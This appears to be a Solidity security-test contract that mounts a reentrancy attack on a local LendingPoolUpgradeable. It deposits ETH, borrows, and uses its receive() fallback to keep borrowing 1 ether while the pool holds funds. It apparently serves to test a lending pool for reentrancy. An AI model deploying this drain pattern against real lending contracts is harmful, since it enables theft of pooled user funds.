// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./LendingPoolUpgradeable.sol";

contract SecurityTest {

    LendingPoolUpgradeable public target;

    // FIX: make address payable
    constructor(address payable _target) {
        target = LendingPoolUpgradeable(_target);
    }

    // Start the attack
    function attack() external payable {
        require(msg.value > 0, "Send ETH to start attack");

        // Deposit into the pool
        target.deposit{value: msg.value}();

        // Try to exploit reentrancy
        target.borrow(msg.value);
    }

    // Fallback for reentrancy loop
    receive() external payable {
        uint256 poolBalance = address(target).balance;

        if (poolBalance >= 1 ether) {
            try target.borrow(1 ether) {

            } catch {

            }
        }
    }
}